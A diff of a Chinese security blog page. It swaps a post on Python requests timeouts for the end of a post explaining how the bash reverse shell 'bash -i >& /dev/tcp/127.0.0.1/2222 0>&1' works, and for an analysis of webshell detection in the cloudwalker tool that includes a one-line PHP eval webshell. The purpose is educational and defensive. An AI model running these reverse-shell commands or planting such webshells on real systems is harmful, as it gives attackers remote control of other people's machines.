+<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
 <ul>
-<li>requests库中timeout参数的具体含义是什么?</li>
-<li>为什么requests.get时timeout参数”失效”?</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="requests库中timeout参数的具体含义是什么"><a href="#requests库中timeout参数的具体含义是什么" class="headerlink" title="requests库中timeout参数的具体含义是什么?"></a>requests库中timeout参数的具体含义是什么?</h2><ul>
-<li><p>requests库中timeout参数是什么?</p>
-<p>根据<a target="_blank" rel="noopener" href="https://docs.python-requests.org/en/master/user/advanced/#timeouts">官网文档</a>所说,timeout可以表示(connect超时时间,read超时时间)</p>
+<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
 </li>
-<li><p>什么是connect超时?</p>
-<p>客户端需要connect系统调用来和服务端做tcp三次握手，当服务地址在互联网上不存在时，connect系统调用耗时就会比较长。</p>
-<p>比如请求1.1.2.3 过一段时间后会返回一个connect tiemout:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;)&#39;</span><br></pre></td></tr></table></figure>
+<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
+<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
+<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
+</li>
+</ul>
+</li>
+<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
+<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
+<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
+<p>  更详细的可以看参考资料</p>
+</li>
+<li><p><code>0&gt;&amp;1</code> 是什么？</p>
+<p>  将标准输入重定向到标准输出</p>
+</li>
+<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
+<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
+<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
+</li>
+</ul>
+<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
+<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
+<li><p>验证<code>&gt;&amp;</code>语法</p>
+<p> <code>&amp;&gt;</code>是一种特殊情况</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
+<li><p>验证 文件描述符指向 socket</p>
+<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>
 
-<p>在上面请求1.1.2.3这个不存在的ip时，客户端发出的 syn 包没有任何响应，于是客户端会重传syn包</p>
+<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
+<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
+<p> 比如下面命令反弹shell会有些问题</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p> 而下面命令可以反弹shell</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
 <ul>
-<li>重传次数在 /proc/sys/net/ipv4/tcp_syn_retries 可以配置</li>
-<li>重传间隔时间并不是固定的，在Linux系统上测试结果是 [1,3,7,15,31]s，似乎就是 2^(n+1)-1</li>
+<li>“&gt;&amp;”的两种用法</li>
+<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对其特殊处理</li>
 </ul>
-<p>如果重试完后仍然没有收到ack包，就会出现connect timeout</p>
-<p>而request的timeout参数就可以减少这个等重传的时间。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;, timeout&#x3D;(1, 100))&#39; # 1s的connect超时设置</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>怎么实现的connect超时控制?</p>
-<p>connect、read等系统调用是没有参数可以控制超时时间的，那connect超时控制是怎么实现的呢?</p>
-<p>在Modules/socketmodule.c可以找到connect函数的实现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. socket设置成非阻塞模式</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sock_call_ex(...,_PyTime_t timeout) &#123;</span><br><span class="line">  ...</span><br><span class="line">  interval &#x3D; timeout;</span><br><span class="line">  ...</span><br><span class="line">  res &#x3D; internal_select(s, writing, interval, connect);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int internal_select(PySocketSockObject *s, int writing, _PyTime_t interval,</span><br><span class="line">            int connect)&#123;</span><br><span class="line">  ...</span><br><span class="line">  ms &#x3D; _PyTime_AsMilliseconds(interval, _PyTime_ROUND_CEILING);</span><br><span class="line">  ...</span><br><span class="line">  n &#x3D; poll(&amp;pollfd, 1, (int)ms);  2. poll系统调用，如果超时,poll系统调用就会返回</span><br></pre></td></tr></table></figure>
-
-<p>流程如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 设置socket为非阻塞模式后，调用connect系统调用</span><br><span class="line">* 使用poll系统调用来判断是否超时</span><br></pre></td></tr></table></figure>
-
-<p>实际上这是一种很通用的对connect做超时控制的方式，在其他tcp客户端中也可以这么实现超时控制。</p>
-</li>
-<li><p>什么是read超时?</p>
-<p>客户端需要调用read系统调用来读取服务端发送的数据，如果服务端一直不发送数据，读数据时就会卡住。</p>
-<p>比如我们用nc命令开启一个服务端只负责监听建立链接,不发送数据.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8081</span><br></pre></td></tr></table></figure>
-<p>客户端请求nc开启的服务,代码如下,3s后会出现读超时</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:8081&quot;, timeout&#x3D;(1,3)) # read超时时间设置成3s</span><br></pre></td></tr></table></figure>
-
-</li>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
 </ul>
-<h2 id="为什么requests-get时timeout参数”失效”"><a href="#为什么requests-get时timeout参数”失效”" class="headerlink" title="为什么requests.get时timeout参数”失效”?"></a>为什么requests.get时timeout参数”失效”?</h2><p>  requests.get在 dns解析、connect、read 这些阶段都有可能耗时比较久。下面分别说一下timeout在这三个阶段中是否生效。</p>
-<p>  文档中只说了timeout控制connect、read两个阶段，说明dns解析耗时很久时timeout是管不了的。<br>  我自己实验，也得出相同的结论：dns解析时间即使超过timeout，也不会抛出异常。</p>
-<p>  connect阶段在上面已经分析过，timeout是可以控制这一阶段最多花费多长时间的。</p>
-<p>  Python中的read超时不是一个全局的时间，它只是在每一次读socket时不能超过这个时间。而一次响应的读取可能有多次read操作。这儿可能和其他的http客户端（比如curl）等超时时间含义不同。</p>
-<p>  如果服务端能够让客户端read非常多次，且每一次时间都不超过read timeout值，这个时候客户端会卡住。</p>
-<p>  所以，在下面两种情况下是会造成read timeout参数“失效”的:</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-webshell%E6%A3%80%E6%B5%8B%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-webshell%E6%A3%80%E6%B5%8B%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">webshell检测总结与实例分析</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>很久之前做过<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/161ffd8e918d70b5029ab828333837c9">webshell检测方案调研</a>，webshell可以在流量安全产品（比如waf、nids）和主机安全产品（hids）检测。</p>
+<p>在流量安全产品常见的检测场景包括：</p>
 <ul>
-<li><p>响应中content-length是一个特别大的数，服务端缓慢的每次响应1字节</p>
-</li>
-<li><p>服务端返回的响应码是100，同时服务端持续不断地返回响应头，也会导致客户端持续不断的read</p>
-<p>比如下面的服务端持续不断地返回响应头，会导致客户端卡住。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from socket import *</span><br><span class="line">from multiprocessing import *</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def dealWithClient(newSocket,destAddr):</span><br><span class="line">    recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">    newSocket.send(b&quot;&quot;&quot;HTTP&#x2F;1.1 100 OK\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        # recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">        newSocket.send(b&quot;&quot;&quot;x:a\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">        if len(recvData)&gt;0:</span><br><span class="line">            # print(&#39;recv[%s]:%s&#39;%(str(destAddr), recvData))</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;[%s]close&#39;%str(destAddr))</span><br><span class="line">            sleep(10)</span><br><span class="line">            print(&#39;over&#39;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    # newSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    serSocket &#x3D; socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    serSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR  , 1)</span><br><span class="line">    localAddr &#x3D; (&#39;&#39;, 8085)</span><br><span class="line">    serSocket.bind(localAddr)</span><br><span class="line">    serSocket.listen(5)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            newSocket,destAddr &#x3D; serSocket.accept()</span><br><span class="line"></span><br><span class="line">            client &#x3D; Process(target&#x3D;dealWithClient, args&#x3D;(newSocket,destAddr))</span><br><span class="line">            client.start()</span><br><span class="line"></span><br><span class="line">            newSocket.close()</span><br><span class="line">    finally:</span><br><span class="line">        serSocket.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>更多的讨论可以见提交的bug <a target="_blank" rel="noopener" href="https://bugs.python.org/issue44022">urllib http client possible infinite loop on a 100 Continue response</a></p>
-</li>
+<li>文件上传接口，比如检查上传的文件名、文件内容</li>
+<li>webshell访问，比如检查常见的webshell管理工具</li>
 </ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>请求在 dns解析、connect、read 这些阶段都有可能耗时很久，其中：</p>
+<p>在主机安全产品常见的检测场景包括：</p>
 <ul>
-<li>dns解析阶段 不受timeout参数控制</li>
-<li>connect阶段 受timeout参数控制</li>
-<li>read阶段 timeout不是全局的，如果服务端让客户端有很多次read操作，就有可能让客户端卡住</li>
+<li>文本内容，比如检查所有php文件是否webshell</li>
+<li>内存马</li>
 </ul>
-<p>阻塞时的connect系统调用是有默认的最大时间限制，这个和系统配置有关；可以用”非阻塞connect+select/poll”来实现connect的超时控制。</p>
-<p>在排查这个case原因时，发现这里存在潜在的dos攻击问题，也上报给Python官方，很快被修复了。</p>
+<p>根据网络上公开资料总结，”文本内容”检测手段包括：<br>| webshell检测技术 | 举例<br>| - | - |<br>| 动态分析-沙箱 | <a target="_blank" rel="noopener" href="https://scanner.baidu.com/#/pages/intro">百度webdir</a> |<br>| 静态分析-正则 |<br>| 静态分析-统计学角度 |<br>| 静态分析-AST |<br>| 机器学习/深度学习 |<br>| RASP | <a target="_blank" rel="noopener" href="https://rasp.baidu.com/doc/dev/official.html">百度OpenRASP</a> |</p>
+<p>长亭开源的<a target="_blank" rel="noopener" href="https://github.com/chaitin/cloudwalker">cloudwalker</a>检测方式较全，个人觉得值得学习。</p>
+<p>本文简要分析cloudwalker的检测手段，应该适合正在调研webshell检测方案的读者阅读。</p>
+<blockquote>
+<p>PS: p牛说他们目前的方案已经和开源版本有非常大的不同，目前方案的线上demo：<a target="_blank" rel="noopener" href="https://forum.xray.cool/webshell">https://forum.xray.cool/webshell</a></p>
+</blockquote>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><ul>
+<li><p>cloudwalker是什么？</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651372030&idx=1&sn=682c49b3decda87ddf0ed641d5d347c6&chksm=8d39c876ba4e4160e88bacf0ffc3cadc39b60a269a6facec9f62134823af829624e42df52376&token=496332164&lang=zh_CN">牧云（CloudWalker）开源手记 | Webshell 监控检测策略初探</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/45796590">牧云（CloudWalker）开源|如约而至: Webshell核心检测引擎</a></p>
+<p>这两篇官方文章其实已经把检测策略介绍过了，总结起来包括四类：</p>
+<ul>
+<li>基于模糊哈希</li>
+<li>基于模糊正则</li>
+<li>基于代码风格</li>
+<li>基于机器学习：模型使用svm，特征包括了三个维度（代码风格、操作序列、操作名）</li>
+</ul>
+</li>
+</ul>
+<h2 id="模糊哈希"><a href="#模糊哈希" class="headerlink" title="模糊哈希"></a>模糊哈希</h2><ul>
+<li><p>是什么？</p>
+<p>用<code>ssdeep</code>命令来实践，看一下生成的模糊哈希。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@vm10-50-0-18 ssdeep_test]# ssdeep &#x2F;usr&#x2F;bin&#x2F;sleep &#x2F;usr&#x2F;bin&#x2F;sleep1 -s</span><br><span class="line">ssdeep,1.1--blocksize:hash:hash,filename</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7:O35Q2Vo5FWkfJ8nXX7,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7:O35Q2Vo5FWkfJ8nXX7,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep1&quot;</span><br><span class="line">[root@vm10-50-0-18 ssdeep_test]# echo 11 &gt;&gt; &#x2F;usr&#x2F;bin&#x2F;sleep1</span><br><span class="line">[root@vm10-50-0-18 ssdeep_test]# ssdeep &#x2F;usr&#x2F;bin&#x2F;sleep &#x2F;usr&#x2F;bin&#x2F;sleep1 -s</span><br><span class="line">ssdeep,1.1--blocksize:hash:hash,filename</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7:O35Q2Vo5FWkfJ8nXX7,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7B:O35Q2Vo5FWkfJ8nXX7B,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来，<code>/usr/bin/sleep1</code> 在添加了两个字节的数据后，算出来的模糊哈希虽然和原来的不同，但是很相似。</p>
+<p>所以可以得出结论：如果文件的”模糊哈希”相似，就很可能文件内容非常相似。</p>
+</li>
+<li><p>cloudwalker怎么用”模糊哈希”检测webshell？</p>
+<p>在 tool/webshell-detector/bin/static/model-latest/SampleHash.txt 文件有计算好的”webshell模糊哈希列表”</p>
+<p>在检测文件时，先计算出”检测对象”的模糊哈希，然后和”webshell模糊哈希列表”做相似度比较</p>
+<p><img src="https://images.gitee.com/uploads/images/2021/1027/201021_0352ba68_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
+</li>
+</ul>
+<h2 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h2><ul>
+<li><p>是什么？</p>
+<p>从代码字符串中统计出的如下信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* WM：代码中的单词总数</span><br><span class="line">* LM：代码行数</span><br><span class="line">* SPL：代码中的分号数量&#x2F;总行数</span><br><span class="line">* SR：符号比例 &#x3D; 符号长度&#x2F;总长度</span><br><span class="line">* ...</span><br></pre></td></tr></table></figure>
+
+<p>这一部分业务逻辑在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/blob/master/tool/webshell-detector/src/Stat.go">Stat.go</a></p>
+</li>
+<li><p>cloudwalker怎么用”代码风格”检测webshell？</p>
+<p>在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/blob/master/tool/webshell-detector/bin/static/config/statState.json">statState.json</a> 中允许用户配置”代码风格合理范围”。cloudWalker计算出”检测对象”的”代码风格”后，会检查是否在此范围内。</p>
+<p>另外，”代码风格”信息会作为机器学习模型中的特征。</p>
+</li>
+</ul>
+<h2 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h2><ul>
+<li><p>cloudwalker怎么用”机器学习”检测webshell？</p>
+<p>使用了两层的机器学习。</p>
+<p>第一层模型使用svm算法，特征包括三类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 前面说的&quot;代码风格&quot;</span><br><span class="line">* &quot;操作序列模型&quot;的预测结果</span><br><span class="line">* &quot;操作名称模型&quot;的预测结果</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.gitee.com/uploads/images/2021/1027/201048_9220c5df_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
+</li>
+<li><p>“操作序列模型”是什么？</p>
+<p>训练好的模型在 tool/webshell-detector/bin/static/model-latest/OpSerial.model</p>
+<p>它使用svm算法，特征是”操作序列”处理后的数据。</p>
+<p>“操作序列”包含了php代码中的”操作特征”。</p>
+</li>
+<li><p>怎么生成”操作序列”？</p>
+<p>由代码获取到抽象语法树后，再由抽象语法树生成”操作序列”。</p>
+<p>举个例子：</p>
+<p>假设待检测的php代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[0]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码生成的抽象语法树（ast）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;successed&quot;,&quot;ast&quot;:&#123;&quot;kind&quot;:132,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:[&#123;&quot;kind&quot;:269,&quot;flags&quot;:1,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;expr&quot;:&#123;&quot;kind&quot;:512,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;expr&quot;:&#123;&quot;kind&quot;:256,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;name&quot;:&quot;_POST&quot;&#125;&#125;,&quot;dim&quot;:0&#125;&#125;&#125;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.gitee.com/uploads/images/2021/1027/201109_7cf149be_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
+<p>对应的”操作序列”如下：</p>
+<p><img src="https://images.gitee.com/uploads/images/2021/1027/201126_9af5fb47_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
+<p>可以看出来，”操作序列”包含了”抽象语法树”两层之间的联系。</p>
+</li>
+</ul>
+<h2 id="抽象语法树"><a href="#抽象语法树" class="headerlink" title="抽象语法树"></a>抽象语法树</h2><ul>
+<li><p>怎么生成”抽象语法树”？</p>
+<p>代码在 tool/webshell-detector/php 目录。</p>
+<p>流程如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 在cloudwalker启动时，[php.c](https:&#x2F;&#x2F;github.com&#x2F;leveryd&#x2F;cloudwalker-source-read&#x2F;blob&#x2F;master&#x2F;tool&#x2F;webshell-detector&#x2F;php&#x2F;php.c)新建子线程，并等待输入。</span><br><span class="line">* 子线程接收php代码后，解析生成&quot;抽象语法树&quot;，将结果返回给主线程。子线程通过管道与主线程通信。</span><br></pre></td></tr></table></figure>
+
+<p>解析能力基于<a target="_blank" rel="noopener" href="https://github.com/nikic/php-ast">php-ast项目</a>，业务逻辑可以见<a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/blob/master/tool/webshell-detector/php/payload/index.php">index.php</a></p>
+<p>可以运行index.php做一点简单的测试：输入包括”字符串长度”和”代码”，输出ast字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  php git:(master) ✗ .&#x2F;bin&#x2F;php payload&#x2F;index.php</span><br><span class="line">26</span><br><span class="line">&lt;?php eval(&#39;$_POST[0]&#39;);?&gt;</span><br><span class="line">142</span><br><span class="line">&#123;&quot;status&quot;:&quot;successed&quot;,&quot;ast&quot;:&#123;&quot;kind&quot;:132,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:[&#123;&quot;kind&quot;:269,&quot;flags&quot;:1,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;expr&quot;:&quot;$_POST[0]&quot;&#125;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/">仓库</a>中放了我阅读代码时的注释，方便有需要的读者。</p>
+<p>从测试效果来看，开源版本和目前线上版本有很大差异：开源版本cloudwalker比较容易绕过，<a target="_blank" rel="noopener" href="https://forum.xray.cool/webshell">线上</a>则难度大很多。</p>
+<p><img src="https://images.gitee.com/uploads/images/2021/1027/201155_7f9c8ee0_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
 
       
     </div>
